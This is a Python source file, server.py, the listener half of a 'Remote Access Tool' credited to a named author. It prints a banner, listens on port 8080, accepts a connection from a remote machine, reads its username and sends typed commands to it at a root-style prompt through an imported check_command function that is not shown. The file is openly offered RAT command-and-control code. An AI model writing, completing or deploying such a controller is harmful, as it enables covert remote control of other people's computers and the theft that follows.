"""
server.py
version = 0.002
Remote Access Tool
Made by Lukas Alstrup
github.com/LukasAlstrup/rat

"""
import os
import socket
import base64
import random
import datetime
import time
from functions import *
import threading
import sys
from queue import Queue
import struct
import signal

#Welcome
print("[+] Welcome to Lukas Alstrup's Remote Access tool")
print("""  _     _    _ _  __           _____            _       _____ _______ _____  _    _ _____  
 | |   | |  | | |/ /    /\    / ____|     /\   | |     / ____|__   __|  __ \| |  | |  __ \ 
 | |   | |  | | ' /    /  \  | (___      /  \  | |    | (___    | |  | |__) | |  | | |__) |
 | |   | |  | |  <    / /\ \  \___ \    / /\ \ | |     \___ \   | |  |  _  /| |  | |  ___/ 
 | |___| |__| | . \  / ____ \ ____) |  / ____ \| |____ ____) |  | |  | | \ \| |__| | |     
 |______\____/|_|\_\/_/    \_\_____/  /_/    \_\______|_____/   |_|  |_|  \_\\____/|_|     
                                                                                           
                                                                                           """)

#Listen
s = socket.socket()
#host = socket.gethostname()
host = "0.0.0.0"
port = 8080

s.bind((host, port))
print("[+] The listener has been started...")
print("[+] LHOST = ", host)
print("[+] LPORT = ", port)
print("[+] Waiting for incomming connections")
s.listen(1)
conn, addr = s.accept()

print("[+] ", addr, "has connected to the server successfully")
print("")

username = conn.recv(10000000)

name = str(str(username.decode()) + "@" + str(addr[0])+ " :~# ")

while True:
    command = str(input(name))
    check_command(conn,command)